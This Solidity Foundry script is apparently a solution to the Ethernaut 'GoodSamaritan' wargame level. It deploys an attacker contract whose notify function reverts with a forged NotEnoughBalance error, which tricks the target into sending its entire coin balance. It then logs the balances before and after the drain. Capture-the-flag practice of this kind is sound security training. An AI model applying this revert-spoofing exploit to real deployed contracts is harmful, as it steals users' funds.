// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GoodSamaritan.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackerContact {
    error NotEnoughBalance();

    function notify(uint256 amount) public {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }

    function attack(address _address) public {
        GoodSamaritan goodSamaritan = GoodSamaritan(_address);

        goodSamaritan.requestDonation();
    }
}

contract GoodSamaritanSolution is Script {
    GoodSamaritan public goodSamaritan = GoodSamaritan(0xE27Fd820B0890aE286633d2f1B13F09932DA71d2);
    Wallet public wallet = Wallet(address(goodSamaritan.wallet()));
    Coin public coin = Coin(address(goodSamaritan.coin()));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before Sermaritan Coin : ", coin.balances(address(wallet)));

        AttackerContact attackerContact = new AttackerContact();

        console.log("Before AttackerContract Coin : ", coin.balances(address(attackerContact)));

        attackerContact.attack(address(goodSamaritan));

        console.log("After Sermaritan Coin : ", coin.balances(address(wallet)));
        console.log("After AttackerContract Coin : ", coin.balances(address(attackerContact)));     

        vm.stopBroadcast();
    }
}